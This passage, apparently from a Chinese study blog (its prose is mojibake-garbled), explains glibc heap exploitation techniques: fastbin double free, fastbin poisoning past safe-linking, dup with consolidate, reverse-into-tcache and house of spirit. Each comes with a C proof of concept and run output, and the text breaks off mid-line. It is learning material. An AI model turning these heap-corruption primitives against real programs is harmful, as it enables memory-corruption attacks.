<p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨<code>new_heap</code>,ç»§è€Œè°ƒç”¨<code>alloc_new_heap</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>heap_info</code>ç»“æ„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = new_heap (size + (<span class="keyword">sizeof</span> (*h) + <span class="keyword">sizeof</span> (*a) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">heap_info *h = alloc_new_heap (size, top_pad, mp_.hp_pagesize, mp_.hp_flags);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p2 = (<span class="type">char</span> *) MMAP (aligned_heap_area, max_size, PROT_NONE, mmap_flags);</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šä¼šè°ƒç”¨mmapç³»ç»Ÿè°ƒç”¨å‘æ“ä½œç³»ç»Ÿè¦ä¸€å¤§å—ç©ºé—´</p>
<h2 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h2><h3 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h3><h4 id="double-free-dup"><a href="#double-free-dup" class="headerlink" title="double free dup"></a>double free dup</h4><p><code>fastbins</code>ä¸­å¯¹äºäºŒæ¬¡é‡Šæ”¾çš„åˆ¤æ–­å¾ˆå”æ°</p>
<p><code>fastbins</code>åªä¼šåˆ¤æ–­å½“å‰æ­£åœ¨é‡Šæ”¾çš„å †å—å’ŒæŒ‚åœ¨æ¡¶å­å¤´ä¸Šçš„ç¬¬ä¸€å—æ˜¯ä¸æ˜¯ç›¸åŒ, å¦‚æœæ˜¯å°±è®¤ä¸ºæ˜¯<code>Double Free</code>äº†</p>
<p>å¦‚æœ<code>fastbin</code>ä¸Šè¿™æ ·:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶é‡Šæ”¾<code>B</code>å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥é€ æˆ<code>Double Free</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastbin[idx] =&gt; B =&gt; A =&gt; B =&gt; NULL</span><br></pre></td></tr></table></figure>



<p>è¿™åˆæœ‰ä¸ªé—®é¢˜,ä½¿ç”¨<code>malloc</code>ç”³è¯·å†…å­˜æ—¶</p>
<p>å¦‚æœ<code>tcachebins</code>ä¸­æœ‰ä¸œè¥¿,é‚£ä¹ˆ<code>malloc</code>ä¼šä»<code>tcache</code>ä¸­æ‹¿,ä¸ä¼šæ‹¿<code>fastbins</code>çš„</p>
<p>ä½†æ˜¯å¦‚æœ<code>tcachebins</code>ä¸­æ²¡ä¸œè¥¿,é‚£ä¹ˆå½“ä»<code>fastbins</code>ä¸­æ‹¿ä¸€ä¸ªä¹‹å,å‰©ä¸‹çš„éƒ½ä¼šè¢«æ”¾åˆ°<code>tcachebins</code>ä¸­</p>
<p>ä¸ºäº†é¿å…<code>tcache</code>æŠ¢ä¸œè¥¿,å¯ä»¥ä½¿ç”¨<code>calloc</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc =&gt; __libc_malloc	//æ­¤å¤„é¦–å…ˆå°è¯•ä»tcacheè·å–å †å—</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–</span><br><span class="line">	</span><br><span class="line">calloc =&gt; __libc_malloc	//ä¸ä½¿ç”¨tcache,ç›´æ¥è°ƒç”¨_int_malloc</span><br><span class="line">	_int_malloc			//æ­¤å¤„å°è¯•ä»æ–Œå®¶è·å–,ä½†æ˜¯å¦‚æœtcacheä¸æ»¡,è¿˜æ˜¯ä¼šæŠ¢æ–Œå®¶çš„å¡«æ»¡tcache</span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†é¿å…<code>tcache</code>é€ æˆå½±å“,å¯ä»¥é¦–å…ˆå°†<code>tcache</code>å¡«æ»¡,ç›®çš„æ˜¯åœ¨æ–Œå®¶åˆ†é…ä¸€æ¬¡å,é¿å…å‰©ä½™çš„å †å—è¿›å…¥<code>tcache</code></p>
<p>ç„¶åä½¿ç”¨<code>calloc</code>å‡½æ•°åˆ†é…,ç›®çš„æ˜¯é¿å…ä»<code>tcache</code>ä¸­å–å †å—</p>
<p>å†™ä¸ª<code>exp</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *A;</span><br><span class="line">    <span class="type">size_t</span> *B;</span><br><span class="line">    <span class="type">size_t</span> *C;</span><br><span class="line">    <span class="comment">// size_t *barrier;        </span></span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       </span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;       <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(B);                    <span class="comment">//next free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; B =&gt; A =&gt; B</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);           <span class="comment">//next malloc from fastbin</span></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B: %p\n&quot;</span>, B);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A: %p\n&quot;</span>, A);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C: %p\n&quot;</span>, C);</span><br><span class="line">    assert(B == C);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# make</span><br><span class="line">gcc -w -g -o fastbin_dup fastbin_dup.c -o fastbin_dup</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins# ./fastbin_dup</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">B: 0x55dd112b2700</span><br><span class="line">A: 0x55dd112b26b0</span><br><span class="line">C: 0x55dd112b2700</span><br></pre></td></tr></table></figure>

<h4 id="poison"><a href="#poison" class="headerlink" title="poison"></a>poison</h4><p>åˆ©ç”¨<code>Double Free</code>,æˆ–è€…å…¶ä»–æ‰‹æ®µ, ä½¿å¾—å †ç®¡ç†å™¨æŒæœ‰æŸä¸ªå †å—æŒ‡é’ˆçš„åŒæ—¶, æˆ‘ä»¬ä¹ŸæŒæœ‰ä¸€ä¸ª</p>
<p>æ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆè¿›è¡Œ<code>Use After Free</code>, å¯¹è¯¥å·²ç»é‡Šæ”¾çš„å †å—è¿›è¡Œå†™å…¥æ“ä½œ, è¦†ç›–è¯¥å †å—çš„å…ƒæ•°æ®, ä¿®æ”¹<code>fd</code>æŒ‡é’ˆæŒ‡å‘ä»»æ„åœ°å€</p>
<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> sz  0x40</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> prev_size;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span>* fd;</span><br><span class="line">    <span class="type">size_t</span>* bk;</span><br><span class="line">&#125;malloc_chunk;</span><br><span class="line"></span><br><span class="line">malloc_chunk fake_chunk=&#123;</span><br><span class="line">    .prev_size = <span class="number">0</span>,</span><br><span class="line">    .size = (sz + <span class="number">0x10</span>) | <span class="number">1</span>,</span><br><span class="line">    .fd = <span class="number">0</span>,</span><br><span class="line">    .bk = <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;printf this time will establish a write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    &#125;</span><br><span class="line">    A = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line">    B = (<span class="type">size_t</span>*)<span class="built_in">malloc</span>(sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;           <span class="comment">//fill tcache</span></span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(A);                        <span class="comment">//free to fastbin</span></span><br><span class="line">    <span class="built_in">free</span>(B);</span><br><span class="line">    <span class="built_in">free</span>(A);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; B =&gt; A</span></span><br><span class="line"></span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    B = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> * fake_chunk_mem = (<span class="type">char</span>*)&amp;fake_chunk + <span class="number">0x10</span>;</span><br><span class="line">    A[<span class="number">0</span>] = ((<span class="type">size_t</span>)A &gt;&gt; <span class="number">12</span>) ^ (<span class="type">size_t</span>)&amp;fake_chunk;</span><br><span class="line">    <span class="comment">//fastbins[idx] =&gt; A =&gt; fake_chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk_mem = %p\n&quot;</span>, fake_chunk_mem);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    A = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A = %p\n&quot;</span>, A);</span><br><span class="line">    C = <span class="built_in">calloc</span>(<span class="number">1</span>,sz);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C = %p\n&quot;</span>, C);</span><br><span class="line">    assert(C == fake_chunk_mem);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# make</span><br><span class="line">gcc -w -g -o fastbin_poison fastbin_poison.c -o fastbin_poison</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_poison</span><br><span class="line"><span class="built_in">printf</span> this time will establish a write buffer</span><br><span class="line">fake_chunk_mem = 0x55d7ebf53030</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">A = 0x55d7ed23d8e0</span><br><span class="line">C = 0x55d7ebf53030</span><br></pre></td></tr></table></figure>



<h4 id="dup-with-consolidate"><a href="#dup-with-consolidate" class="headerlink" title="dup_with_consolidate"></a>dup_with_consolidate</h4><p>0.å¡«å……<code>tcache</code></p>
<p>1.æ‰¾ä¸€ä¸ªä¸<code>topchunk</code>ç›¸é‚»çš„å°å †å—,<code>free</code>è¿›å…¥<code>fastbins</code>,&#x3D;&#x3D;å¹¶ç»§ç»­æŒæœ‰å…¶æŒ‡é’ˆ&#x3D;&#x3D;</p>
<p>2.å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å¯¼è‡´<code>malloc_consolidate</code>,ä½¿å¾—<code>fastbins</code>ä¸­çš„å †å—åˆå¹¶åˆ°<code>topchunk</code>,ç„¶åæœ¬æ¬¡ç”³è¯·æ‹¿åˆ°åŒä¸€ä¸ªæŒ‡é’ˆ,ä½†æ˜¯å †å—å¤§å°å˜æˆäº†<code>0x411</code>(åŒ…æ‹¬å…ƒæ•°æ®,æ ‡å¿—ä½å’Œç”¨æˆ·ç©ºé—´)</p>
<p>3.<code>free</code>å°å †å—çš„é‡æŒ‡é’ˆ,è¿™å®é™…ä¸Šä¼šå¯¼è‡´å¤§å—è¢«é‡Šæ”¾è¿›å…¥<code>unsortedbin</code></p>
<p>4.å†æ¬¡å‘èµ·<code>0x400</code>å­—èŠ‚çš„åˆ†é…ç”³è¯·,å†æ¬¡æ‹¿åˆ°åŒä¸€ä¸ªå †å—</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this printf will establish the write buffer\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> * tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> * A;</span><br><span class="line">    <span class="type">size_t</span> * B;</span><br><span class="line">    <span class="type">size_t</span> * C;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    A = <span class="built_in">malloc</span>(<span class="number">0x40</span>);           <span class="comment">//malloc a chunk next to the topchunk</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]); <span class="comment">//fill the tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// A = calloc(1,0x40);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A:%p\n&quot;</span>,A);</span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//return A back to fastbins</span></span><br><span class="line"></span><br><span class="line">    B = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//cause a malloc_consolidate , merge A with the topchunk , then malloc B with the same address of A</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;B:%p\n&quot;</span>,B);</span><br><span class="line">    assert(A == B);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(A);                    <span class="comment">//double free A , then B will be free</span></span><br><span class="line"></span><br><span class="line">    C = <span class="built_in">malloc</span>(<span class="number">0x400</span>);          <span class="comment">//malloc C at the same address of B </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;C:%p\n&quot;</span>,C);</span><br><span class="line">    assert(C == B);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_dup_consolidate</span><br><span class="line">this <span class="built_in">printf</span> will establish the write buffer</span><br><span class="line">A:<span class="number">0x563058c578e0</span></span><br><span class="line">B:<span class="number">0x563058c578e0</span></span><br><span class="line">C:<span class="number">0x563058c578e0</span></span><br></pre></td></tr></table></figure>



<p>ç‰¹ç‚¹æ˜¯ä¸éœ€è¦<code>calloc</code></p>
<h4 id="reverse-into-tcache"><a href="#reverse-into-tcache" class="headerlink" title="reverse_into_tcache"></a>reverse_into_tcache</h4><p>å¦‚æœ<code>fastbin</code>ä¸­æœ‰å¤šäºä¸€ä¸ªå †å—,<code>tcache</code>ç©º</p>
<p>é‚£ä¹ˆä»è¯¥<code>fastbin</code>ä¸­æ‹¿ä¸€ä¸ªå †å—æ—¶,é¦–å…ˆä¼šæŠŠ<code>tcache</code>å¡«æ»¡,ç„¶åå†ä»<code>tcache</code>ä¸­æ‹¿å‡ºä¸€ä¸ªå †å—æ¥</p>
<p>å¹¶ä¸”<code>fastbin</code>å’Œ<code>tcache</code>éƒ½æ˜¯é“¾æ ˆç»“æ„</p>
<p>è¿™ä¼šå¯¼è‡´<code>fastbin</code>ä¸­çš„å †å—è¿æ¥é¡ºåºåè¿‡æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fastbins[idx]-&gt;1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7</span><br><span class="line"></span><br><span class="line">tcachebins[idx]-&gt;7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">    <span class="type">size_t</span> *tcache_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">size_t</span> *fastbin_chunks[<span class="number">7</span>];</span><br><span class="line">    <span class="type">int</span> usable_size = <span class="number">0x10</span>;</span><br><span class="line">    <span class="type">int</span> chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> fake_chunk[<span class="number">7</span>];</span><br><span class="line">    <span class="built_in">memset</span>(fake_chunk,<span class="number">0x3c</span>,<span class="keyword">sizeof</span>(fake_chunk));</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;++i)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        fastbin_chunks[i] = <span class="built_in">malloc</span>(usable_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(fastbin_chunks[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    *fastbin_chunks[<span class="number">0</span>] = ((<span class="type">size_t</span>)fastbin_chunks[<span class="number">0</span>] &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>)&amp;fake_chunk);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">7</span>;i++)&#123;</span><br><span class="line">        tcache_chunks[i] = <span class="built_in">malloc</span>(usable_size);     <span class="comment">//empty tcache</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(usable_size);            <span class="comment">//reverse fastbin into tcache</span></span><br><span class="line">    victim = <span class="built_in">malloc</span>(usable_size);   <span class="comment">//get stack address</span></span><br><span class="line">    assert(victim == (<span class="type">size_t</span>*)&amp;fake_chunk[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# gcc fastbin_reverse_into_tcache.c -o fastbin_reverse_into_tcache -w -g</span><br><span class="line">root@Destroyer:/mnt/c/Users/xidian/Desktop/pwncollege/bins/test# ./fastbin_reverse_into_tcache</span><br></pre></td></tr></table></figure>

<h4 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house_of_mind"></a>house_of_mind</h4><p>ä¸ä¼š</p>
<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h4><p>ä»»æ„å †å—é‡Šæ”¾è¿›å…¥<code>fastbin</code></p>
<p>æ„é€ å‡å †å—æ—¶éœ€è¦æ³¨æ„ç‰©ç†ä¸Šç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„<code>prev_size</code>å­—æ®µ</p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ£€æŸ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> fail = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might result in a false positive.  Redo the test after</span></span><br><span class="line"><span class="comment">   getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (!have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">    fail = (chunksize_nomask(chunk_at_offset(p, size)) &lt;= CHUNK_HDR_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem);</span><br><span class="line">    __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fail)</span><br><span class="line">    malloc_printerr(<span class="string">&quot;free(): invalid next size (fast)&quot;</span>);</span><br><span 